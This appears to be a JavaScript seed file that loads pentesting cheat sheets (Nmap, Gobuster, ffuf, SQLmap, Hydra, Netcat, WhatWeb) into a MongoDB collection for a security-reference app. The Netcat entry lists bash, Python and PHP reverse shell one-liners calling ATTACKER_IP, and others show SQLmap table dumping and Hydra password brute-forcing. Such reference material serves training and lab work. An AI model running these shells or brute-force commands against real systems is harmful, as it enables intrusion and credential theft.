import connectToDatabase from './mongodb';
import Tool from './models/Tool';

const TOOLS = [
  {
    name: 'Nmap',
    slug: 'nmap',
    category: 'recon',
    description: 'Network exploration tool and security/port scanner. The standard for network reconnaissance.',
    officialUrl: 'https://nmap.org',
    cheatsheet: `**Basic Syntax:** nmap [options] [target]

**Common Flags:**
- \`-sV\` — Detect service/version info
- \`-sC\` — Run default NSE scripts  
- \`-p-\` — Scan all 65535 ports
- \`-A\` — Aggressive (OS detect, version, scripts, traceroute)
- \`-T4\` — Faster scan timing
- \`-oN\` — Save output in normal format
- \`-oA\` — Save all output formats

**Basic Service Scan:**
\`\`\`bash
nmap -sV -sC -p- -T4 10.10.10.121 -oN scan.txt
\`\`\`

**Quick Top Ports:**
\`\`\`bash
nmap -sV --top-ports 1000 10.10.10.121
\`\`\`

**Full Aggressive:**
\`\`\`bash
nmap -A -p- 10.10.10.121
\`\`\`

**UDP Scan (requires root):**
\`\`\`bash
sudo nmap -sU --top-ports 100 10.10.10.121
\`\`\`

**NSE Script Examples:**
\`\`\`bash
nmap --script=vuln 10.10.10.121
nmap --script=http-enum 10.10.10.121
nmap --script=smb-vuln* 10.10.10.121
\`\`\``,
  },
  {
    name: 'Gobuster',
    slug: 'gobuster',
    category: 'web',
    description: 'Tool used to brute-force URIs (directories and files) in web sites and DNS subdomains.',
    officialUrl: 'https://github.com/OJ/gobuster',
    cheatsheet: `**Common Modes:**
- \`dir\` — Directory/file brute-force
- \`dns\` — DNS subdomain brute-force
- \`vhost\` — Virtual host brute-force

**Directory Scan:**
\`\`\`bash
gobuster dir -u http://10.10.10.121/ -w /usr/share/wordlists/dirb/common.txt
\`\`\`

**With file extensions:**
\`\`\`bash
gobuster dir -u http://10.10.10.121/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
\`\`\`

**DNS Subdomain:**
\`\`\`bash
gobuster dns -d target.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
\`\`\`

**Key Flags:**
- \`-u\` — Target URL
- \`-w\` — Wordlist path
- \`-x\` — File extensions
- \`-t\` — Threads (default 10)
- \`-r\` — Follow redirects
- \`--no-error\` — Suppress errors
- \`-o\` — Output file`,
  },
  {
    name: 'ffuf',
    slug: 'ffuf',
    category: 'web',
    description: 'Fast web fuzzer written in Go. Used for directory discovery and parameter/header fuzzing.',
    officialUrl: 'https://github.com/ffuf/ffuf',
    cheatsheet: `**Core Concept:** Replace target with \`FUZZ\` keyword

**Directory Fuzzing:**
\`\`\`bash
ffuf -u http://10.10.10.121/FUZZ -w /usr/share/wordlists/dirb/common.txt
\`\`\`

**File Extension Fuzzing:**
\`\`\`bash
ffuf -u http://10.10.10.121/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt
\`\`\`

**Subdomain Fuzzing:**
\`\`\`bash
ffuf -u http://FUZZ.target.com -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
\`\`\`

**Parameter Fuzzing (POST):**
\`\`\`bash
ffuf -u http://target.com/login -X POST -d "username=FUZZ&password=test" -w usernames.txt
\`\`\`

**Key Flags:**
- \`-u\` — Target URL
- \`-w\` — Wordlist
- \`-mc\` — Match HTTP codes (e.g. 200,301)
- \`-fc\` — Filter HTTP codes
- \`-fs\` — Filter by response size
- \`-t\` — Threads
- \`-o\` — Output file (JSON format)`,
  },
  {
    name: 'SQLmap',
    slug: 'sqlmap',
    category: 'exploitation',
    description: 'Automatic SQL injection and database takeover tool.',
    officialUrl: 'https://sqlmap.org',
    cheatsheet: `**Basic Detection:**
\`\`\`bash
sqlmap -u "http://target.com/page?id=1" --dbs
\`\`\`

**From Burp Request File:**
\`\`\`bash
sqlmap -r request.txt --dbs
\`\`\`

**Dump Database:**
\`\`\`bash
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
\`\`\`

**POST Request:**
\`\`\`bash
sqlmap -u "http://target.com/login" --data="username=test&password=test" --dbs
\`\`\`

**Key Flags:**
- \`--dbs\` — Enumerate databases
- \`--tables\` — Enumerate tables
- \`--dump\` — Dump data
- \`--level\` — Test level (1-5)
- \`--risk\` — Risk level (1-3)
- \`--batch\` — Non-interactive mode
- \`--os-shell\` — OS shell (if vulnerable)
- \`--cookie\` — Supply session cookie`,
  },
  {
    name: 'Hydra',
    slug: 'hydra',
    category: 'passwords',
    description: 'Fast and flexible online password cracking tool supporting numerous protocols.',
    officialUrl: 'https://github.com/vanhauser-thc/thc-hydra',
    cheatsheet: `**SSH Brute Force:**
\`\`\`bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.121
\`\`\`

**HTTP Form Brute Force:**
\`\`\`bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.121 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
\`\`\`

**FTP:**
\`\`\`bash
hydra -l admin -P rockyou.txt ftp://10.10.10.121
\`\`\`

**Key Flags:**
- \`-l\` — Username (single)
- \`-L\` — Username wordlist
- \`-p\` — Password (single)
- \`-P\` — Password wordlist
- \`-t\` — Parallel tasks (threads)
- \`-V\` — Verbose (show each attempt)
- \`-f\` — Stop on first valid pair`,
  },
  {
    name: 'Netcat',
    slug: 'netcat',
    category: 'post-exploitation',
    description: "The 'Swiss Army knife' of networking. Used for reverse shells, port scans, file transfers.",
    officialUrl: 'https://nmap.org/ncat',
    cheatsheet: `**Listen for Reverse Shell:**
\`\`\`bash
nc -lvnp 4444
\`\`\`

**Connect to Target:**
\`\`\`bash
nc 10.10.10.121 80
\`\`\`

**Simple Bind Shell (victim):**
\`\`\`bash
nc -lvnp 4444 -e /bin/bash
\`\`\`

**Reverse Shell One-Liners (on victim):**
\`\`\`bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
\`\`\`

**File Transfer:**
\`\`\`bash
# Receiver
nc -lvnp 9999 > received_file

# Sender  
nc TARGET_IP 9999 < file_to_send
\`\`\``,
  },
  {
    name: 'Whatweb',
    slug: 'whatweb',
    category: 'recon',
    description: 'Identifies technologies used on websites including CMS, JS frameworks, and server info.',
    officialUrl: 'https://github.com/urbanadventurer/WhatWeb',
    cheatsheet: `**Single Target:**
\`\`\`bash
whatweb 10.10.10.121
\`\`\`

**Verbose output:**
\`\`\`bash
whatweb -v http://10.10.10.121
\`\`\`

**Scan a subnet (suppress errors):**
\`\`\`bash
whatweb --no-errors 10.10.10.0/24
\`\`\`

**Aggressive detection:**
\`\`\`bash
whatweb -a 3 http://10.10.10.121
\`\`\`

**Key Flags:**
- \`-a\` — Aggression level (1-4)
- \`-v\` — Verbose
- \`--no-errors\` — Suppress errors
- \`-U\` — Custom user-agent
- \`--log-json\` — JSON output file`,
  },
];

export async function seedTools() {
  await connectToDatabase();
  let seeded = 0;
  for (const tool of TOOLS) {
    const existing = await Tool.findOne({ slug: tool.slug });
    if (!existing) {
      await Tool.create(tool);
      seeded++;
    }
  }
  return seeded;
}
